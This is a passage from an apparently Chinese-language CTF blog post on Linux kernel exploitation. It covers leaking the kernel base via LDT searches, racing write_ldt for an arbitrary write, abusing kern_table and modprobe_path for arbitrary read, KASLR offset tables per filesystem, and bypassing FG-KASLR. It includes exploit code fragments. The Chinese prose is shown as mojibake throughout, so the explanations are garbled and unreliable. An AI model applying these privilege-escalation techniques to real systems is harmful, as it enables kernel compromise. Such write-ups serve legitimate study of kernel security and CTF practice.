class="line">                kernel_base = buf[i] -  <span class="number">0x030</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\033[32m\033[1m at \033[0m%p\n&quot;</span>, kernel_base, search_addr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br><span class="line">kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-å®ç°ä»»æ„åœ°å€å†™"   >
          <a href="#3-å®ç°ä»»æ„åœ°å€å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®ç°ä»»æ„åœ°å€å†™" class="headerlink" title="(3)å®ç°ä»»æ„åœ°å€å†™"></a>(3)å®ç°ä»»æ„åœ°å€å†™</h3>
      <p>åŒæ ·çš„è¿˜æ˜¯å…³äº<code>entries</code>æŒ‡é’ˆï¼Œå¦‚ä¸‹åœ¨<code>write_ldt</code>å‡½æ•°ä¸­çš„ä»£ç ï¼Œ<code>entry_number</code>å¯æ§ï¼Œ<code>ldt</code>ä¸å¤ªå¯æ§ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆ<code>write_ldt</code>ä¸€ä¸ª<code>new_nr_entries</code>å‡ºæ¥ï¼Œç„¶åå†ä¸‹ä¸€æ¬¡<code>write_ldt</code>å°±å¯ä»¥ç»™<code>old_nr_entries</code>èµ‹å€¼ï¼Œè¿›è€Œåœ¨<code>memcpy</code>çš„æ—¶å€™æ‹·è´å¤§é‡æ•°æ®ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"><span class="comment">//...//</span></span><br><span class="line"><span class="comment">//è®¾ç½®æ–°ldt_structç»“æ„ä½“çš„entriesæŒ‡é’ˆ</span></span><br><span class="line"> <span class="comment">//#define LDT_ENTRY_SIZE    8</span></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»ldtç»“æ„ä½“ä¸­æ‹·è´8ä¸ªå­—èŠ‚åˆ°å¯¹åº”ä½ç½®</span></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></div></figure>

<p>è€Œå¦‚æœè¿™æ—¶æœ‰ä¸ªæ¡ä»¶ç«äº‰ï¼Œåœ¨æ‹·è´è¿‡ç¨‹ä¸­å°†<code>new_ldt-&gt;entries</code>ç»™åŠ«æŒäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥å€ŸåŠ©æ‹·è´ä¹‹åçš„è¯­å¥<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>æ¥ä¾æ®<code>ldt</code>ä¿®æ”¹åŠ«æŒä¹‹åçš„<code>new_ldt-&gt;entries</code>å¯¹åº”å†…å­˜ã€‚</p>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶å¯ä»¥ä¿®æ”¹ï¼Œä½†æ˜¯å…¶å®<code>ldt</code>ç”±äºä¹‹å‰æåˆ°çš„è®¾ç½®åŸå› ï¼Œå…¶æ•°æ®ä¼šæœ‰æ‰€æ”¹å˜ï¼Œä¸å¤ªèƒ½éšæ„å¯æ§ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥è®¾ç½®4ä¸ªå­—èŠ‚çš„0æ•°æ®ï¼Œé‚£å°±å¯ä»¥è®¾ç½®å½“å‰è¿›ç¨‹çš„euidäº†ï¼Œè¿™æ ·ä¹Ÿèƒ½ææƒï¼Œä½†æ˜¯è¿˜æ²¡æ¥è§¦åˆ°æ€ä¹ˆé€šè¿‡euidè®¾ç½®æ¥ææƒã€‚</p>
<p>ä½†æ˜¯<code>arttnba3</code>å¸ˆå‚…å†™çš„ç”¨æ¥ä¿®æ”¹euidä¹‹åè°ƒç”¨<code>seteuid</code>çš„æ–¹æ³•å¥½ä½¿ï¼Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦çš„æ•°æ®ä¸ç”¨å¤ªä¸¥è‹›å—?ä¸å¤ªæ¸…æ¥šå“ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">desc.base_addr = <span class="number">0</span>;</span><br><span class="line">desc.entry_number = <span class="number">2</span>;</span><br><span class="line">desc.limit = <span class="number">0</span>;</span><br><span class="line">desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">desc.contents = <span class="number">0</span> ;</span><br><span class="line">desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">desc.lm = <span class="number">0</span>;</span><br><span class="line">desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">desc.useable = <span class="number">0</span>;</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br></pre></td></tr></table></div></figure>




        <h2 id="5-kern-tableæ•°ç»„"   >
          <a href="#5-kern-tableæ•°ç»„" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-kern-tableæ•°ç»„" class="headerlink" title="5.kern_tableæ•°ç»„"></a>5.kern_tableæ•°ç»„</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†-1"   >
          <a href="#å‰ç½®çŸ¥è¯†-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†-1" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      <p>è¿™ä¸ªä¸èƒ½å«ç»“æ„ä½“å§ï¼Œä¸è¿‡è¿™ä¸ªå¯ä»¥åˆ©ç”¨</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17  /kernel/sysctl.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> <span class="title">kern_table</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">    &#123;</span><br><span class="line">        .procname	= <span class="string">&quot;modprobe&quot;</span>,</span><br><span class="line">        .data		= &amp;modprobe_path,</span><br><span class="line">        .maxlen		= KMOD_PATH_LEN,</span><br><span class="line">        .mode		= <span class="number">0644</span>,</span><br><span class="line">        .proc_handler	= proc_dostring,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .procname	= <span class="string">&quot;modules_disabled&quot;</span>,</span><br><span class="line">        .data		= &amp;modules_disabled,</span><br><span class="line">        .maxlen		= <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .mode		= <span class="number">0644</span>,</span><br><span class="line">        <span class="comment">/* only handle a transition from default &quot;0&quot; to &quot;1&quot; */</span></span><br><span class="line">        .proc_handler	= proc_dointvec_minmax,</span><br><span class="line">        .extra1		= SYSCTL_ONE,</span><br><span class="line">        .extra2		= SYSCTL_ONE,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­åŒ…å«å¾ˆå¤š<code>/proc/sys/kernel/</code>ä¸‹çš„æ–‡ä»¶å¥æŸ„ï¼Œè¿™äº›æ˜¯åœ¨linuxå†…æ ¸å¯åŠ¨æ—¶å°±è¿›è¡Œæ˜ å°„çš„ï¼Œå’Œæ–‡ä»¶ç›¸å…³ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹è¿™äº›å¥æŸ„ï¼Œæ¯”å¦‚å°†<code>data</code>æŒ‡é’ˆä¿®æ”¹åˆ°ä»»æ„ä½ç½®ï¼Œå½“æˆ‘ä»¬æ‰“å¼€<code>/proc/sys/kernel/</code>ä¸‹å¯¹åº”çš„æ–‡ä»¶æ—¶ï¼Œå°±èƒ½ä¾æ®<code>data</code>æŒ‡é’ˆï¼Œè¯»å–åˆ°è¯¥æŒ‡é’ˆå¯¹åº”çš„æ•°æ®ã€‚</p>
<p>è€Œæˆ‘ä»¬ä¸»è¦å°±æ˜¯åˆ©ç”¨å…¶ä¸­çš„<code>CONFIG_MODULES</code>å®šä¹‰ä¸‹çš„<code>modprobe</code>ï¼Œä¹Ÿå°±æ˜¯ä»¥å‰ææƒç»å¸¸ç”¨åˆ°çš„<code>modprobe_path</code>ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œ<code>modeprobe</code>è¿™ä¸ªæ–‡ä»¶æ˜ å°„å¥æŸ„å…¶ä¸­ä¿å­˜ç€<code>modprobe_path</code>è¿™ä¸ªå…¨å±€å˜é‡</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281410940.png" alt="image-20220328141017757"></p>
<p>å†…å­˜åˆ†å¸ƒå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281412927.png" alt="image-20220328141220790"></p>

        <h3 id="å®ç°ä»»æ„è¯»å–"   >
          <a href="#å®ç°ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#å®ç°ä»»æ„è¯»å–" class="headerlink" title="å®ç°ä»»æ„è¯»å–"></a>å®ç°ä»»æ„è¯»å–</h3>
      
        <h4 id="å†…å­˜æ˜ å°„"   >
          <a href="#å†…å­˜æ˜ å°„" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜æ˜ å°„" class="headerlink" title="å†…å­˜æ˜ å°„"></a>å†…å­˜æ˜ å°„</h4>
      <p>é™¤äº†ä¸Šè¿°çš„å¯åŠ¨å†…æ ¸æ—¶å‘ç”Ÿæ˜ å°„å¤–ï¼Œå½“æˆ‘ä»¬è¿è¡Œç¨‹åºæ—¶ï¼Œä¹Ÿä¼šåœ¨å†…æ ¸çš„çº¿æ€§åˆ†é…åŒº<code>page_offset_base</code>å³<code>0xffff888000000000</code>å‘ç”Ÿæ˜ å°„ï¼Œæ¯”å¦‚å¦‚ä¸‹çš„v5.6ç‰ˆæœ¬ä¸‹çš„å†…æ ¸ï¼Œæ²¡å¼€å¯KASLRçš„æƒ…å†µä¸‹æ˜ å°„åç§»ä¸º<code>0x2444100</code>å¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281706047.png" alt="image-20220328170627765"></p>
<p>å¯ä»¥çœ‹åˆ°æ•°æ®å®Œå…¨ä¸€è‡´ï¼Œè€Œç”±äºæ˜¯æ˜ å°„å…³ç³»ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹å…¶ä¸­ä¸€éƒ¨åˆ†çš„æ•°æ®æ—¶ï¼Œå¦ä¸€éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œå°è¯•ä¿®æ”¹<code>data</code>æŒ‡é’ˆä¸º<code>0xffffffff82446ab0</code>ï¼Œä¸¤è¾¹éƒ½å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281710474.png" alt="image-20220328171003365"></p>

        <h4 id="å†…å­˜å¤åˆ¶"   >
          <a href="#å†…å­˜å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜å¤åˆ¶" class="headerlink" title="å†…å­˜å¤åˆ¶"></a>å†…å­˜å¤åˆ¶</h4>
      <p>é™¤äº†å†…å­˜æ˜ å°„åŒºåŸŸä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå†…å­˜å¤åˆ¶åŒºåŸŸï¼Œä¹Ÿæ˜¯åœ¨<code>page_offset_base</code>ä¸Šï¼Œæ¯”å¦‚è¿™é‡Œçš„åç§»ä¸º<code>0xec8a440</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281721303.png" alt="image-20220328172112145"></p>
<p>å¯ä»¥çœ‹åˆ°å®Œå…¨ä¸€æ ·çš„ï¼Œä½†æ˜¯ç”±äºæ˜¯å¤åˆ¶çš„å…³ç³»ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ˜ å°„å…³ç³»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å†…å­˜æ˜ å°„çš„<code>modprobe</code>çš„<code>data</code>æŒ‡é’ˆæŒ‡å‘å†…å­˜å¤åˆ¶çš„<code>modprobe</code>çš„<code>data</code>æŒ‡é’ˆï¼Œæ‰“å¼€<code>/proc/sys/kernel/modprobe</code>æ–‡ä»¶å³å¯è·å–åˆ°å†…å­˜å¤åˆ¶åŒºåŸŸçš„<code>modprobe</code>çš„<code>data</code>æŒ‡é’ˆæ•°æ®ï¼Œå³<code>modprobe_path</code>çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨åªæœ‰å †åœ°å€å’Œä»»æ„å†™çš„æ—¶å€™ï¼Œä¸æ³„éœ²å†…æ ¸åŸºåœ°å€çš„æƒ…å†µä¸‹ï¼Œå®Œæˆ<code>modprobe_path</code>çš„åœ°å€æ³„éœ²ã€‚</p>

        <h4 id="KASLR"   >
          <a href="#KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4>
      <p>å¦‚æœå¼€å¯äº†<code>KASLR</code>çš„è¯ï¼Œå°±æœ‰ç‚¹ä¸åŒäº†ï¼Œç”±äºæ˜¯æ–‡ä»¶å†…å­˜æ˜ å°„å’Œå¤åˆ¶çš„å…³ç³»ï¼Œæ‰€ä»¥è¿™ä¸ªæ˜ å°„å’Œå¤åˆ¶çš„åç§»é‡å…¶å®æ¯”è¾ƒå–å†³äºæ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸ç‰ˆæœ¬ï¼Œå†…æ ¸çš„æ–‡ä»¶ç³»ç»Ÿæ¯”è¾ƒå¤æ‚ï¼ŒVFSæ¥å£ä¸‹å¯è¿æ¥ä¸€å †çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿåˆéƒ½æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½éœ€è¦å®é™…åˆ†æï¼Œä»¥ä¸‹æ˜¯æˆ‘çš„æµ‹è¯•ç»“æœ</p>

        <h5 id="SVR4"   >
          <a href="#SVR4" class="heading-link"><i class="fas fa-link"></i></a><a href="#SVR4" class="headerlink" title="SVR4"></a>SVR4</h5>
      <p>è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¹Ÿå°±æ˜¯æˆ‘ä»¬kernelé¢˜ä¸­å¸¸è§çš„cpioåç¼€ä½¿ç”¨çš„ï¼Œæ²¡æœ‰å¼€å¯KASLRçš„æ—¶å€™ï¼Œæ˜ å°„å’Œå¤åˆ¶çš„åç§»éƒ½æ˜¯ç¡®å®šçš„ï¼Œå®é™…è°ƒä¸€ä¸‹ï¼Œå€Ÿç”¨pedaæ’ä»¶çš„findåŠŸèƒ½å¯ä»¥å®¹æ˜“æœç´¢åˆ°ã€‚ä½†æ˜¯å¼€å¯ä¹‹åï¼Œå¤åˆ¶çš„åç§»åŸºæœ¬ä¸ä¼šå˜åŒ–ï¼Œä½†æ˜¯æ˜ å°„çš„åç§»ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæµ‹è¯•å¤šæ¬¡å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5.6</span><br><span class="line">#modprobe_map 0x2444100</span><br><span class="line">#modprobe_map 0x6844100</span><br><span class="line">#modprobe_map 0x6c44100</span><br><span class="line">#modprobe_map 0xd244100</span><br><span class="line">#modprobe_map 0x5844100</span><br><span class="line"></span><br><span class="line">#modprobe_copy 0xec8a440</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯è§‚å¯Ÿä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå…¶å®åç§»å‘ç”Ÿçš„è¯ï¼Œç›¸å¯¹äºæ˜ å°„åŒºåŸŸï¼Œåªæœ‰ä¸€ä¸ªå­—èŠ‚å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•çˆ†ç ´è¿™ä¸€ä¸ªå­—èŠ‚æ¥è·å–ã€‚</p>

        <h5 id="ext4"   >
          <a href="#ext4" class="heading-link"><i class="fas fa-link"></i></a><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h5>
      <p>è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¹Ÿæ¯”è¾ƒå¸¸è§ï¼Œä¸è¿‡æ¯”è¾ƒå¥½çš„ä¸€ç‚¹å°±æ˜¯ï¼Œå®é™…æµ‹è¯•ç»“æœå‘ç°æ˜ å°„å’Œå¤åˆ¶çš„åç§»åœ¨å¼€å¯KASLRä¹‹åéƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥æµ‹å‡ºæ¥å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v5.15.26</span><br><span class="line">#modprobe_map 0x3502530</span><br><span class="line">#modprobe_copy 0x264e608</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªä¸»è¦æ˜¯æœ€è¿‘çš„LINECTFä¸Šçš„encryptè¿™ä¸ªå†…æ ¸é¢˜äº‹åçœ‹WPå‡ºæ¥çš„ï¼Œå¿˜è®°å“ªä½å¸ˆå‚…äº†ã€‚</p>

        <h3 id="å…¶ä»–çŒœæƒ³"   >
          <a href="#å…¶ä»–çŒœæƒ³" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…¶ä»–çŒœæƒ³" class="headerlink" title="å…¶ä»–çŒœæƒ³"></a>å…¶ä»–çŒœæƒ³</h3>
      <p>ä¹‹å‰çš„<code>kern_table</code>çš„ç»“æ„å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰<code>.mode</code>å±æ€§ï¼Œè¿™ä¸ªå±æ€§å…¶å®å°±æ˜¯è¯¥æ–‡ä»¶çš„æƒé™å±æ€§ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥<code>ls -al file</code>å‡ºæ¥çš„ç›¸å…³æƒé™</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329193540405.png" alt="image-20220329193540405"></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹å…¶è¿›è¡Œæ“æ§ã€‚</p>

        <h4 id="æƒé™æ›´æ”¹"   >
          <a href="#æƒé™æ›´æ”¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#æƒé™æ›´æ”¹" class="headerlink" title="æƒé™æ›´æ”¹"></a>æƒé™æ›´æ”¹</h4>
      <p>çŒœæƒ³ä¸€ä¸‹å¦‚æœæ›´æ”¹è¯¥æ–‡ä»¶ï¼Œä½¿å…¶å†…å®¹å˜ä¸ºä¸€ä¸ªå¯æ‰§è¡Œçš„elfæ–‡ä»¶ï¼ŒåŠŸèƒ½ä¸º<code>cat /flag</code>ï¼Œç„¶åæ›´æ”¹å…¶æƒé™ï¼Œèµ‹äºˆsuidçš„æƒé™ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°±å¯ä»¥ä»¥rootæƒé™æ¥<code>cat flag</code>ã€‚å½¢å¼å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329205636964.png" alt="image-20220329205636964"></p>

        <h4 id="å­˜åœ¨é—®é¢˜"   >
          <a href="#å­˜åœ¨é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#å­˜åœ¨é—®é¢˜" class="headerlink" title="å­˜åœ¨é—®é¢˜"></a>å­˜åœ¨é—®é¢˜</h4>
      <p>ä½†æ˜¯è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘å®é™…æ“ä½œçš„æ—¶å€™ï¼Œæƒé™å€’æ˜¯å¾ˆå®¹æ˜“æ›´æ”¹ï¼Œä½†æ˜¯å†…å®¹ä¸èƒ½å†™å…¥<code>\x00</code>å’Œ<code>\n</code>ï¼Œå°±å¾ˆä¸å¥½åˆ¶ä½œä¸€ä¸ªå¯æ‰§è¡Œçš„ELFæ–‡ä»¶ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–åŠæ³•ç»•è¿‡ã€‚</p>
<p>å¯å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tinylab-1.gitbook.io/cbook/02-chapter8" >æ‰“é€ å²ä¸Šæœ€å°å¯æ‰§è¡ŒELFæ–‡ä»¶(45å­—èŠ‚) - C è¯­è¨€ç¼–ç¨‹é€è§† (gitbook.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æ­¤å¤–ä¹‹å‰Pç¥çš„æ–‡ç« ä¹Ÿæåˆ°ï¼Œå¦‚æœåªæ˜¯suidçš„æƒé™çš„è¯ï¼Œç”¨shellè„šæœ¬æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ–¹é¢ä¹Ÿä¸å¤ªèƒ½å¤Ÿæå®šã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >è°ˆä¸€è°ˆLinuxä¸suidææƒ | ç¦»åˆ«æ­Œ (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è‡³ä»Šè¿˜æ˜¯ä¸çŸ¥é“æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p>

        <h2 id="6-ksymtabæ•°ç»„"   >
          <a href="#6-ksymtabæ•°ç»„" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-ksymtabæ•°ç»„" class="headerlink" title="6.__ksymtabæ•°ç»„"></a>6.__ksymtabæ•°ç»„</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†-2"   >
          <a href="#å‰ç½®çŸ¥è¯†-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†-2" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      <p>é€šå¸¸ç”¨åœ¨å¼€å¯<code>FG-KASLR</code>çš„æƒ…å†µï¼Œè¯¥ä¿æŠ¤éœ€è¦ç¼–è¯‘æ—¶å¼€å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_FG_KASLR=y</span><br><span class="line">CONFIG_MODULE_FG_KASLR=y #æ¨¡å—éšæœºåŒ–</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡<code>nofgkaslr</code>æ¥å…³é—­</p>
<p>ä¸è¿‡æˆ‘åœ¨ç¼–è¯‘è®¾ç½®<code>.config</code>çš„æ—¶å€™ï¼Œæ²¡æœ‰æ‰¾åˆ°è¿™äº›é€‰é¡¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#__ksymtab" >FGKASLR - CTF Wiki (ctf-wiki.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/" >Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä¸»è¦åœ¨äº</p>
<ul>
<li><p>å†…æ ¸ç¬¦å·è¡¨<code>__ksymtab </code></p>
</li>
<li><p><code>.data</code></p>
</li>
<li><p><code>swapgs_restore_regs_and_return_to_usermode</code></p>
</li>
<li><p><code>modprobe_path</code></p>
</li>
<li><p>å­˜åœ¨äº<code>.text_base</code>åˆ°<code>__x86_retpoline_r15</code>çš„å‡½æ•°æ²¡æœ‰å—åˆ°å½±å“ã€‚æ˜¾ç„¶<code>commit_creds</code>å’Œ<code>prepare_kernel_cred()</code>æ²¡æœ‰åŒ…å«åœ¨å†…ï¼Œä½†æ˜¯å¯ä»¥åœ¨é‡Œé¢å¯»æ‰¾ä¸€äº›gadget</p>
</li>
</ul>
<p>ä»¥ä¸Šå‡ä¸ä¼šå‘ç”Ÿ<code>FG-KASLR</code>çš„éšæœºåŒ–</p>
<p>é‚£ä¹ˆè¿™é‡Œå°±æ˜¯ä¸»è¦å…³æ³¨äº<code>__ksymtab</code>æ•°ç»„ï¼Œå­˜åœ¨äºè¯¥æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°å—éƒ½æœ‰å¦‚ä¸‹ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /include/linux/export.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> value_offset;</span><br><span class="line">	<span class="keyword">int</span> name_offset;</span><br><span class="line">	<span class="keyword">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ³¨æ„æ˜¯åœ¨v5.17ä¸‹ï¼Œåœ¨ä½ç‰ˆæœ¬ä¸‹å¥½åƒåå­—æœ‰ç‚¹ä¸åŒï¼Œä¸è¿‡ä¹Ÿå¤§åŒå°å¼‚</p>

        <h3 id="ç»•è¿‡FG-KASLR"   >
          <a href="#ç»•è¿‡FG-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç»•è¿‡FG-KASLR" class="headerlink" title="ç»•è¿‡FG-KASLR"></a>ç»•è¿‡FG-KASLR</h3>
